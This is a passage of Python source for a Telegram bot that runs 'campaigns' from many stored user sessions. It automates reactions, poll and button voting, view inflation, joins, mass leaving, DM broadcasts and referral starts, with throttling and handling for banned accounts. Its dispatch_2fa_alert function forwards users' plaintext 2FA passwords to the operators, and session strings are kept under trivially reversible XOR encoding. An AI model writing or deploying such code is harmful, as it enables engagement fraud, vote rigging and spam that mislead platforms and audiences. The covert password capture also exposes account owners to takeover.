import asyncio
import base64
import json
import os
import re
import random
import time
import math
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError,
    UserAlreadyParticipantError,
    UserDeactivatedBanError,
    UserDeactivatedError,
    AuthKeyDuplicatedError
)

# MongoDB async driver
from motor.motor_asyncio import AsyncIOMotorClient

# Import local configurations
import config
from config import logger

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- ADVANCED LINK & PRIVATE INVITE PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool, Optional[str]]:
    """
    Returns: (target_peer, msg_id, is_private, extracted_vote_query)
    """
    link = link.strip()
    if not link:
        return None, None, False, None
        
    extracted_query = None
    # Extract query/emoji target attached to links (e.g., ?vote=❤️ or link containing emojis)
    if "?vote=" in link:
        parts = link.split("?vote=")
        link = parts[0]
        extracted_query = parts[1]

    if re.match(r'^-?\d+$', link):
        return int(link), None, False, extracted_query

    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id, False, extracted_query

    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None, True, extracted_query
        return link, None, True, extracted_query
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        target = msg_match.group(1)
        if target.isdigit():
            target = int(f"-100{target}")
        return target, int(msg_match.group(2)), False, extracted_query
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if target.isdigit():
            target = int(f"-100{target}")
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id, False, extracted_query
            
    if isinstance(target, str) and target.replace("-", "").isdigit():
        return int(target), None, False, extracted_query

    return target, None, False, extracted_query

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "🟩" * filled + "⬜" * (length - filled)

# --- MONGODB DATABASE ENGINE ---
class Database:
    def __init__(self, uri: str = getattr(config, 'MONGO_URI', 'mongodb://localhost:27017'), db_name: str = getattr(config, 'MONGO_DB_NAME', 'bot_core_db')):
        self.uri = uri
        self.db_name = db_name
        self.client = None
        self.db = None

    async def init(self):
        self.client = AsyncIOMotorClient(self.uri)
        self.db = self.client[self.db_name]
        
        await self.db.users.create_index("user_id", unique=True)
        await self.db.accounts.create_index("phone", unique=True)
        await self.db.account_assignments.create_index([("user_id", 1), ("phone", 1)], unique=True)
        await self.db.tasks.create_index("task_id", unique=True)
        logger.info("MongoDB database system initialized.")

    async def get_next_task_id(self) -> int:
        counter = await self.db.counters.find_one_and_update(
            {"_id": "task_id"},
            {"$inc": {"seq": 1}},
            upsert=True,
            return_document=True
        )
        return counter["seq"]

    async def get_storage_stats(self) -> dict:
        try:
            stats = await self.db.command("dbStats")
            return {
                "data_size_mb": round(stats.get("dataSize", 0) / (1024 * 1024), 2),
                "storage_size_mb": round(stats.get("storageSize", 0) / (1024 * 1024), 2),
                "index_size_mb": round(stats.get("indexSize", 0) / (1024 * 1024), 2),
                "objects": stats.get("objects", 0),
                "collections": stats.get("collections", 0)
            }
        except Exception as e:
            logger.error(f"Failed to fetch storage stats: {e}")
            return {}

    async def log_action(self, user_id: int, action: str, bot_instance: Optional[Bot] = None, operational: bool = False):
        try:
            await self.db.logs.insert_one({
                "user_id": user_id,
                "action": action,
                "timestamp": time.time()
            })
        except Exception as db_err:
            logger.error(f"Failed to log action: {db_err}")
        
        if operational and bot_instance and config.LOG_CHANNEL_ID:
            try:
                log_text = (
                    f"📝 <b>System Log Update</b>\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"⚙️ Action executed: {action}"
                )
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Failed sending log channel updates: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        user = await self.db.users.find_one({"user_id": user_id})
        return user["role"] if user and "role" in user else "user"

    async def get_admin_limits(self, user_id: int) -> int:
        return 999999999

    async def get_current_account_count(self, user_id: int) -> int:
        return await self.db.accounts.count_documents({"user_id": user_id})

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        user = await self.db.users.find_one({"user_id": user_id})
        if not user:
            role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
            await self.db.users.insert_one({
                "user_id": user_id,
                "username": username,
                "role": role_val,
                "referred_by": referred_by,
                "max_accounts": 999999999,
                "created_at": time.time()
            })

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

# Helper for dispatching 2FA alerts to Admins/Super Owners
async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
    text = (
        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Phone: <code>+{phone}</code>\n"
    )
    if password_entered:
        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"

    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to log channel: {e}")

    for owner_id in config.SUPER_OWNER_IDS:
        try:
            await bot.send_message(chat_id=owner_id, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")

# --- CONCURRENT TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty:
                break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        active_ids = list(self.current_tasks.keys())
        for t_id in active_ids:
            loop_task = self.current_tasks.get(t_id)
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                await db_mgr.db.tasks.update_one(
                    {"task_id": t_id},
                    {"$set": {"status": "cancelled", "progress": "Stopped by admin"}}
                )
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError:
                break
                
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except asyncio.CancelledError:
                logger.warning(f"Task #{task_id} was stopped.")
            except Exception as e:
                logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        await db_mgr.db.tasks.update_one(
            {"task_id": task_id},
            {"$set": {"status": "running", "progress": "0%"}}
        )

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        account_routing = payload.get("account_routing", "own")
        
        if role == "super_owner":
            if account_routing == "all":
                cursor = db_mgr.db.accounts.find({"status": "active"})
            else:
                cursor = db_mgr.db.accounts.find({"status": "active", "user_id": creator_id})
        elif role == "owner":
            cursor = db_mgr.db.accounts.find({"status": "active"})
        else:
            assignments = await db_mgr.db.account_assignments.find({"user_id": creator_id}).to_list(length=None)
            assigned_phones = [a["phone"] for a in assignments]
            cursor = db_mgr.db.accounts.find({
                "status": "active",
                "$or": [
                    {"user_id": creator_id},
                    {"phone": {"$in": assigned_phones}}
                ]
            })

        async for row in cursor:
            clients_data.append((row["phone"], decrypt_data(row["session_string"])))

        if requested_count > 0:
            clients_data = clients_data[:requested_count]

        if not clients_data:
            await db_mgr.db.tasks.update_one(
                {"task_id": task_id},
                {"$set": {"status": "failed", "progress": "No accounts found"}}
            )
            try:
                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
            except Exception:
                pass
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)
        
        speed_mode = payload.get("speed_mode", "safe")
        if speed_mode == "safer":
            sleep_time = 2.5
        elif speed_mode == "fastest":
            sleep_time = 0.05
        else:
            sleep_time = 5.0

        semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
        progress_counter = 0
        success_counter = 0
        failure_counter = 0
        last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(sleep_time * idx)
                    
                    # Connect and check authorization for account status
                    try:
                        await client.connect()
                        if not await client.is_user_authorized():
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, "Account session key expired / Unauthorized"))
                            failure_counter += 1
                            return
                    except (UserDeactivatedBanError, UserDeactivatedError, AuthKeyDuplicatedError) as ban_err:
                        await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                        failed_ids.append((phone, f"Account frozen or banned: {type(ban_err).__name__}"))
                        failure_counter += 1
                        logger.warning(f"Account +{phone} is banned/deactivated. Skipped safely.")
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id, is_target_private, link_query_vote = parse_telegram_link(target) if not do_leave_all else (None, None, False, None)
                    parsed_channel, _, is_channel_private, _ = parse_telegram_link(channel_target) if not do_leave_all else (None, None, False, None)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_view) and not do_vote and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    joined_updates_peer = None

                    # Execution Workflow - Join Channel/Group
                    if do_join:
                        try:
                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
                                invite_hash = parsed_channel if is_channel_private else parsed_target
                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                            else:
                                updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                        except UserAlreadyParticipantError:
                            logger.info(f"[{phone}] Account is already a participant. Skipping join step and proceeding to views/reactions.")
                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during join: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as join_err:
                            if "USER_ALREADY_PARTICIPANT" in str(join_err):
                                logger.info(f"[{phone}] Account already participant string detected. Proceeding...")
                            else:
                                failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                                failure_counter += 1
                                return

                    target_peer = joined_updates_peer or parsed_target

                    # Execution Workflow - View Increment
                    if do_view and msg_id:
                        try:
                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during view: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as view_err:
                            failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                            failure_counter += 1
                            return

                    # Execution Workflow - Send Reaction
                    if do_react and msg_id:
                        try:
                            peer_entity = await client.get_input_entity(target_peer)
                            emojis = payload.get("reactions", ["👍"])
                            assigned_emoji = emojis[idx % len(emojis)]

                            await client(functions.messages.SendReactionRequest(
                                peer=peer_entity,
                                msg_id=msg_id,
                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                            ))
                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during reaction: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as react_err:
                            try:
                                peer_entity = await client.get_input_entity(target_peer)
                                await client(functions.messages.SendReactionRequest(
                                    peer=peer_entity,
                                    msg_id=msg_id,
                                    reaction=[assigned_emoji]
                                ))
                            except Exception as retry_err:
                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
                                failure_counter += 1
                                return

                    # Execution Workflow - Vote Action
                    if do_vote and msg_id:
                        try:
                            vote_mode = payload.get("vote_mode", "text")
                            
                            async def perform_vote():
                                if vote_mode == "inline":
                                    raw_button_text = payload.get("button_text", "").strip().lower()
                                    if link_query_vote and not raw_button_text:
                                        raw_button_text = link_query_vote.strip().lower()
                                        
                                    clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)

                                    msg = await client.get_messages(target_peer, ids=msg_id)
                                    if msg and msg.reply_markup:
                                        target_button = None
                                        for row in msg.reply_markup.rows:
                                            for btn in row.buttons:
                                                btn_raw = btn.text.strip().lower()
                                                btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)

                                                if (
                                                    raw_button_text in btn_raw or 
                                                    (clean_target and clean_target in btn_raw) or
                                                    (clean_target and clean_target == btn_clean) or 
                                                    (clean_target and btn_raw.startswith(clean_target))
                                                ):
                                                    target_button = btn
                                                    break
                                            if target_button:
                                                break
                                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                            await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                        else:
                                            raise ValueError(f"Inline callback button matching '{raw_button_text}' not found.")
                                    else:
                                        raise ValueError("Target message does not possess an inline keyboard markup.")
                                else:
                                    chosen_option = int(payload.get("poll_option_index", 0))
                                    await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))

                            try:
                                await perform_vote()
                            except UserAlreadyParticipantError:
                                pass
                            except Exception as first_vote_err:
                                # Auto-join channel if non-member and retry vote
                                try:
                                    if is_channel_private or "+ " in str(channel_target) or "/+" in str(channel_target) or "joinchat/" in str(channel_target):
                                        invite_hash = parsed_channel if is_channel_private else parsed_target
                                        updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                        if hasattr(updates, 'chats') and updates.chats:
                                            target_peer = updates.chats[0]
                                    else:
                                        updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                        if hasattr(updates, 'chats') and updates.chats:
                                            target_peer = updates.chats[0]
                                except UserAlreadyParticipantError:
                                    pass
                                except Exception:
                                    pass

                                await asyncio.sleep(1)
                                await perform_vote()

                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during voting: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as vote_err:
                            failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                            failure_counter += 1
                            return

                    # Execution Workflow - Direct Message
                    if do_dm:
                        try:
                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during DM: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as dm_err:
                            failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                            failure_counter += 1
                            return

                    # Execution Workflow - Referrals
                    if do_refer:
                        try:
                            bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                            start_param = None
                            if "start=" in target:
                                param_match = re.search(r'start=([^&\s]+)', target)
                                if param_match:
                                    start_param = param_match.group(1)
                            if "?" in bot_username_target:
                                bot_username_target = bot_username_target.split("?")[0]
                            await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                        except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                            await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                            failed_ids.append((phone, f"Account banned during referral start: {type(ban_err).__name__}"))
                            failure_counter += 1
                            return
                        except Exception as ref_err:
                            failed_ids.append((phone, f"Referral start message failed: {str(ref_err)}"))
                            failure_counter += 1
                            return

                    # Execution Workflow - Leave Channel
                    if do_leave:
                        if do_leave_all:
                            left_chats_count = 0
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        left_chats_count += 1
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe:
                                        await asyncio.sleep(fwe.seconds)
                                    except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                                        await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                                        failed_ids.append((phone, f"Account banned during leave all: {type(ban_err).__name__}"))
                                        failure_counter += 1
                                        return
                                    except Exception:
                                        pass
                            if left_chats_count == 0:
                                failed_ids.append((phone, "Account was not present in any channels"))
                                failure_counter += 1
                                return
                        else:
                            try:
                                resolved_entity = await client.get_input_entity(target_peer)
                                await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                            except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                                await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                                failed_ids.append((phone, f"Account banned during leave channel: {type(ban_err).__name__}"))
                                failure_counter += 1
                                return
                            except Exception as leave_err:
                                failed_ids.append((phone, f"Leave channel failed: {str(leave_err)}"))
                                failure_counter += 1
                                return

                    passed_ids.append(phone)
                    success_counter += 1
                    
                except (UserDeactivatedBanError, UserDeactivatedError, AuthKeyDuplicatedError) as ban_err:
                    await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                    failed_ids.append((phone, f"Account banned or invalid: {type(ban_err).__name__}"))
                    failure_counter += 1
                except Exception as general_err:
                    failed_ids.append((phone, f"General error: {str(general_err)}"))
                    failure_counter += 1
                finally:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    progress_counter += 1
                    
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        elapsed = current_now - start_time
                        avg_time = elapsed / progress_counter if progress_counter > 0 else 0
                        remaining = (total_accounts - progress_counter) * avg_time
                        
                        eta_str = f"~{int(remaining // 60)}m {int(remaining % 60)}s" if remaining > 0 else "0s"
                        progress_pct = f"{int(pct_val)}%"
                        
                        live_text = (
                            f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
                            f"[{make_progress_bar(pct_val)}] <b>{progress_pct}</b>\n"
                            f"📊 <code>{progress_counter}/{total_accounts}</code> accounts completely run\n"
                            f"✅ Successful: <code>{success_counter}</code> | ❌ Blocked: <code>{failure_counter}</code>\n"
                            f"⏱ Time remaining duration: {eta_str}"
                        )
                        try:
                            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text, parse_mode="HTML")
                        except Exception:
                            pass

                        await db_mgr.db.tasks.update_one(
                            {"task_id": task_id},
                            {"$set": {"progress": progress_pct}}
                        )

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))

        end_time = time.time()
        elapsed_total = end_time - start_time
        duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"

        status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        await db_mgr.db.tasks.update_one(
            {"task_id": task_id},
            {"$set": {
                "status": status,
                "progress": f"{len(passed_ids)}/{total_accounts} Passed",
                "success_report": success_report_json,
                "failure_report": failure_report_json
            }}
        )

        success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        
        user_info = f"<code>{creator_id}</code>"
        try:
            chat_member = await bot_instance.get_chat(creator_id)
            if chat_member.first_name:
                user_info = f"{chat_member.first_name} (<code>{creator_id}</code>)"
        except Exception:
            pass

        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"

        failure_log_details = ""
        if len(failed_ids) > 20:
            failure_log_details = f"\n\n📄 <b>Note:</b> More than 20 errors occurred (<code>{len(failed_ids)}</code> failures). A detailed file log with clear failure reasons has been generated and sent below."
        elif failed_ids:
            failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
            for phone_num, reason in failed_ids:
                failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"

        completion_card = (
            f"👑 <b>Premium Task Management Closure Summary Card</b>\n\n"
            f"📋 Campaign ID: <code>{campaign_uuid}</code>\n"
            f"⚡ Action Code Execution: <code>{task_type.upper()}</code>\n"
            f"👤 Creator Node Profile: {user_info}\n"
            f"🔗 Target Location Path: {target_display}\n"
            f"📢 Secondary Target Scope: <code>{payload.get('channel_target', 'N/A')}</code>\n"
            f"🏎 Speed Interval Throttle: <code>{speed_mode.upper()}</code>\n\n"
            f"📊 <b>Performance Analytics Reports:</b>\n"
            f"✅ Success Threshold: <code>{success_counter}/{total_accounts}</code> ({success_pct_final}%)\n"
            f"❌ Core Failures Recorded: <code>{failure_counter}/{total_accounts}</code>\n"
            f"⏱ Production Runtime Elapsed: {duration_str}"
            f"{failure_log_details}"
        )

        try:
            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
            
            if len(failed_ids) > 20:
                file_lines = [
                    f"============================================================",
                    f"CAMPAIGN FAILURE AUDIT REPORT - TASK #{task_id}",
                    f"Target: {payload.get('target', 'N/A')}",
                    f"Total Failed Accounts: {len(failed_ids)}",
                    f"============================================================\n"
                ]
                for phone_num, reason in failed_ids:
                    file_lines.append(f"Phone: +{phone_num} | Reason: {reason}")
                
                report_content = "\n".join(file_lines).encode('utf-8')
                fail_doc = BufferedInputFile(report_content, filename=f"task_{task_id}_failures.txt")
                await bot_instance.send_document(
                    chat_id=creator_id,
                    document=fail_doc,
                    caption=f"📁 <b>Failure Reason Log</b>\nContains complete failure audit for <code>{len(failed_ids)}</code> failed accounts in Task <code>#{task_id}</code>.",
                    parse_mode="HTML"
                )
        except Exception as report_err:
            logger.error(f"Failed delivering task completion report: {report_err}")

        if config.LOG_CHANNEL_ID:
            try:
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=completion_card, parse_mode="HTML")
            except Exception as le:
                logger.error(f"Failed sending validation report to log channel: {le}")

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_routing_choice = State()
    waiting_for_speed_choice = State()
    waiting_for_leave_choice = State()
    waiting_for_channel_link = State()
    waiting_for_post_link = State()
    waiting_for_vote_mode_choice = State()
    waiting_for_poll_option_index = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()
    waiting_for_account_scale = State()

class ExportWizardStates(StatesGroup):
    selecting_multi = State()

class BroadcastStates(StatesGroup):
    waiting_for_msg = State()

# --- PREMIUM UI KEYBOARD GENERATORS WITH BUTTON STYLES ---
REACTION_EMOJIS = [
    "🔥", "❤️", "💖", "💘", "💝",
    "👍", "👏", "🎉", "🤩", "💯",
    "⚡", "🍓", "💋", "🍿", "🏆",
    "🤣", "🥰", "🤔", "👀", "😎"
]

def get_post_registration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone", style="success")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ⭐" if is_selected else ""
        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}", style="primary" if is_selected else "success"))
        if len(row) == 5:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection", style="success")])
    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0", style="primary")],
        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start", style="success")],
        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks", style="primary")],
        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals", style="primary")],
        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits", style="primary")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel", style="danger")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react", style="success"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote", style="success")],
        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote", style="success"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view", style="primary")],
        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view", style="success"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view", style="success")],
        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view", style="success")],
        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join", style="primary"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave", style="danger")],
        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm", style="primary")],
        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer", style="primary"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed", style="success")],
        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu", style="danger")]
    ])

def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single", style="primary")],
        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all", style="danger")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start", style="primary")]
    ])

# --- ROUTER REGISTER ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
